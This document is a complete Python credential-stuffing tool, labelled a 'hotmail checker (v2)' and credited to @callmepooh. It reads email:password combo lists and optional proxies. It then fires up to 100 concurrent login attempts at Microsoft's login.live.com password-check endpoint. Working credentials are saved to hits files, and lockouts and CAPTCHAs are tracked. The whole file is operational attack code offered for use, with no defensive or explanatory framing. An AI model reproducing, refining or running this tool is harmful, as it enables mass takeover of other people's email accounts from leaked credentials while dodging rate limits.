import os
import sys
import time
import asyncio

import aiohttp


UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
TIMEOUT = aiohttp.ClientTimeout(total=20, connect=10)
THREADS = 100

C_GREEN = "\033[92m"
C_RED = "\033[91m"
C_YELLOW = "\033[93m"
C_CYAN = "\033[96m"
C_GRAY = "\033[90m"
C_RESET = "\033[0m"
C_BOLD = "\033[1m"


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def verify_credit():
    try:
        with open(__file__, "r", encoding="utf-8") as f:
            src = f.read()
        if "@callmepooh" not in src:
            print(f"\n{C_RED}{C_BOLD}[!] ERROR: THIS CHECKER HAS BEEN TAMPERED WITH.{C_RESET}")
            print(f"{C_RED}[!] Please contact the creator @callmepooh for the original version.{C_RESET}\n")
            input(f"{C_GRAY}press enter to exit...{C_RESET}")
            sys.exit(1)
    except Exception:
        pass


def fix_proxy(line):
    line = line.strip()
    if not line:
        return None
    if line.startswith("http://") or line.startswith("https://"):
        return line
    bits = line.split(":")
    if len(bits) == 4:
        host, port, user, pw = bits
        return f"http://{user}:{pw}@{host}:{port}"
    return "http://" + line


def banner():
    clear()
    print(f"{C_CYAN}{C_BOLD}")
    print("  +--------------------------------------------------+")
    print("  |              hotmail checker  (v2)               |")
    print("  |         by @callmepooh  ·  t.me/cr6cker          |")
    print("  +--------------------------------------------------+")
    print(f"{C_RESET}")


def pick_file(title, filetypes):
    """Açılır pencereden dosya seçtirir. İptal edilirse None döner."""
    try:
        import tkinter as tk
        from tkinter import filedialog
    except Exception:
        return None

    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    path = filedialog.askopenfilename(title=title, filetypes=filetypes)
    root.destroy()
    return path or None


def ask_combo():
    while True:
        print(f"{C_GRAY}combo dosyası seçiliyor... (açılan pencereden seç){C_RESET}")
        p = pick_file("Combo dosyasını seç", [("Text files", "*.txt"), ("All files", "*.*")])
        if p and os.path.exists(p):
            print(f"{C_GREEN}[+] combo: {p}{C_RESET}")
            return p
        print(f"{C_RED}[!] dosya seçilmedi veya bulunamadı, tekrar dene{C_RESET}")


def ask_proxy():
    while True:
        a = input(f"{C_GRAY}proxy kullanılsın mı? (y/n) > {C_RESET}").strip().lower()
        if a in ("y", "yes"):
            while True:
                print(f"{C_GRAY}proxy dosyası seçiliyor... (açılan pencereden seç){C_RESET}")
                p = pick_file("Proxy dosyasını seç", [("Text files", "*.txt"), ("All files", "*.*")])
                if p and os.path.exists(p):
                    print(f"{C_GREEN}[+] proxy: {p}{C_RESET}")
                    return p
                print(f"{C_RED}[!] dosya seçilmedi veya bulunamadı, tekrar dene{C_RESET}")
        if a in ("n", "no"):
            return None
        print(f"{C_RED}[!] y veya n yaz{C_RESET}")


def load_combos(path):
    out = []
    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or ":" not in line:
                continue
            u, p = line.split(":", 1)
            u, p = u.strip(), p.strip()
            if u and p:
                out.append(f"{u}:{p}")
    return out


def load_proxies(path):
    if not path:
        return []
    out = []
    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line:
                fixed = fix_proxy(line)
                if fixed:
                    out.append(fixed)
    return out


class Saver:
    def __init__(self, out_dir):
        self.out_dir = out_dir
        os.makedirs(out_dir, exist_ok=True)
        self.hits = open(os.path.join(out_dir, "hits.txt"), "a", buffering=1, encoding="utf-8")
        self.clean = open(os.path.join(out_dir, "hits_clean.txt"), "a", buffering=1, encoding="utf-8")
        self.done = open(os.path.join(out_dir, "done.txt"), "a", buffering=1, encoding="utf-8")
        self.allf = open(os.path.join(out_dir, "all.txt"), "a", buffering=1, encoding="utf-8")
        self.hit_seen = set()
        self.done_seen = set()
        hp = os.path.join(out_dir, "hits.txt")
        dp = os.path.join(out_dir, "done.txt")
        if os.path.exists(hp):
            with open(hp, encoding="utf-8", errors="ignore") as f:
                for ln in f:
                    c = ln.split(" | ", 1)[0].strip()
                    if c:
                        self.hit_seen.add(c)
        if os.path.exists(dp):
            with open(dp, encoding="utf-8", errors="ignore") as f:
                for ln in f:
                    c = ln.strip()
                    if c:
                        self.done_seen.add(c)

    def is_done(self, combo):
        return combo in self.done_seen

    @staticmethod
    def _sync(f):
        try:
            os.fsync(f.fileno())
        except Exception:
            pass

    def write(self, combo, status, info):
        try:
            self.allf.write(f"{combo} | {status} | {info}\n")
            self.allf.flush()
        except Exception:
            pass
        if combo not in self.done_seen:
            try:
                self.done.write(combo + "\n")
                self.done.flush()
                self._sync(self.done)
                self.done_seen.add(combo)
            except Exception:
                pass
        if status == "HIT" and combo not in self.hit_seen:
            try:
                self.hits.write(f"{combo} | {info}\n")
                self.hits.flush()
                self._sync(self.hits)
                self.clean.write(f"{combo}\n")
                self.clean.flush()
                self._sync(self.clean)
                self.hit_seen.add(combo)
            except Exception:
                pass

    def close(self):
        for f in (self.hits, self.clean, self.done, self.allf):
            try:
                f.close()
            except Exception:
                pass


def new_session():
    conn = aiohttp.TCPConnector(limit=0, ssl=False, force_close=True,
                                enable_cleanup_closed=True, ttl_dns_cache=120)
    return aiohttp.ClientSession(connector=conn, cookie_jar=aiohttp.CookieJar())


async def check_v2(session, email, pw, proxy):
    h = {
        "User-Agent": UA,
        "Accept": "application/json",
        "Origin": "https://login.live.com",
        "Content-Type": "application/json; charset=utf-8",
    }
    payload = {"username": email, "password": pw, "checkpasswordflowtoken": ""}
    async with session.post("https://login.live.com/checkpassword.srf",
                            json=payload, headers=h, proxy=proxy,
                            timeout=TIMEOUT) as r:
        body = await r.text(errors="ignore")
        code = r.status
    low = body.lower()
    if 'validationresult":"succeed' in low:
        return "HIT", "succeed"
    if 'validationresult":"fail' in low:
        return "BAD", "fail"
    if "toomanyattempts" in low:
        return "LOCKED", "toomany"
    if "captcha" in low or "hip" in low:
        return "CAPTCHA", "chal"
    return "BAD", f"code_{code}"


def color_for(status):
    return {
        "HIT": C_GREEN,
        "BAD": C_RED,
        "LOCKED": C_YELLOW,
        "CAPTCHA": C_YELLOW,
        "ERROR": C_GRAY,
    }.get(status, C_RESET)


async def run(combos, proxies):
    date_str = time.strftime("%Y-%m-%d_%H-%M-%S")
    out_dir = os.path.join("results", date_str)
    saver = Saver(out_dir)

    remaining = [c for c in combos if not saver.is_done(c)]
    skipped = len(combos) - len(remaining)

    print(f"{C_CYAN}[+]{C_RESET} output: {C_BOLD}{out_dir}{C_RESET}")
    print(f"{C_CYAN}[+]{C_RESET} {len(combos)} total · {skipped} already done · {len(remaining)} to check")
    print(f"{C_CYAN}[+]{C_RESET} {len(proxies)} proxies · threads {THREADS}")
    print(f"{C_GRAY}{'-' * 70}{C_RESET}")

    if not remaining:
        print(f"{C_YELLOW}[!] nothing to do{C_RESET}")
        saver.close()
        return

    sem = asyncio.Semaphore(THREADS)
    stats = {"HIT": 0, "BAD": 0, "CAPTCHA": 0, "LOCKED": 0, "ERROR": 0}
    total = 0
    lock = asyncio.Lock()
    t0 = time.time()

    async def one(idx, combo):
        nonlocal total
        email, pw = combo.split(":", 1)
        px = proxies[idx % len(proxies)] if proxies else None
        async with sem:
            session = new_session()
            try:
                try:
                    st, info = await check_v2(session, email, pw, px)
                except Exception as e:
                    st, info = "ERROR", type(e).__name__
                saver.write(combo, st, info)
                async with lock:
                    stats[st] = stats.get(st, 0) + 1
                    total += 1
                    el = max(time.time() - t0, 0.01)
                    cpm = int(total / el * 60)
                    col = color_for(st)
                    print(f"{col}[{st:7}]{C_RESET} {email}:{pw} "
                          f"{C_GRAY}| {info} | {total} | {cpm} cpm{C_RESET}")
            finally:
                try:
                    await session.close()
                except Exception:
                    pass

    tasks = [asyncio.create_task(one(i, c)) for i, c in enumerate(remaining)]
    await asyncio.gather(*tasks, return_exceptions=True)
    saver.close()

    el = time.time() - t0
    print(f"{C_GRAY}{'-' * 70}{C_RESET}")
    print(f"{C_CYAN}[+]{C_RESET} done in {el:.1f}s · {total} checks · {int(total/max(el,0.01)*60)} cpm")
    print(f"    {C_GREEN}HIT {stats['HIT']}{C_RESET}  "
          f"{C_RED}BAD {stats['BAD']}{C_RESET}  "
          f"{C_YELLOW}CAP {stats['CAPTCHA']}{C_RESET}  "
          f"{C_YELLOW}LOCK {stats['LOCKED']}{C_RESET}  "
          f"{C_GRAY}ERR {stats['ERROR']}{C_RESET}")
    print(f"{C_CYAN}[+]{C_RESET} hits → {out_dir}\\hits_clean.txt")
    print(f"{C_GRAY}    by @callmepooh  ·  t.me/cr6cker{C_RESET}")


def main():
    verify_credit()
    banner()
    combo_path = ask_combo()
    proxy_path = ask_proxy()

    combos = load_combos(combo_path)
    proxies = load_proxies(proxy_path) if proxy_path else []

    if not combos:
        print(f"{C_RED}[!] no valid combos in file{C_RESET}")
        input(f"\n{C_GRAY}press enter to exit...{C_RESET}")
        sys.exit(1)

    try:
        asyncio.run(run(combos, proxies))
    except KeyboardInterrupt:
        print(f"\n{C_YELLOW}[!] interrupted · everything checked so far is saved{C_RESET}")
    finally:
        print(f"\n{C_GRAY}{'-' * 70}{C_RESET}")
        input(f"{C_CYAN}[+]{C_RESET} finished. press {C_BOLD}enter{C_RESET} to close... ")


if __name__ == "__main__":
    main()
